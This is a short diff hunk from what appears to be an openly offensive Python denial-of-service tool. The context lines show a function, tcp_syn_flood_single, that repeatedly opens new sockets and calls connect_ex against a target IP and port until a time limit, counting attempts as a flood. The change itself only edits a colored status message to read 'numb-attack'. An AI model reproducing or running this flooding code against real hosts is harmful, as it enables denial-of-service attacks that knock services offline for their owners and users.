@@ -80,7 +80,7 @@ def tcp_syn_flood_single(ip, port, duration):
         while time.time() < end_time:
             time.sleep(0.2)
             print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!")
-            print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94m0k...!\033[0m")
+            print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
             sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
             packet_count += 1
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
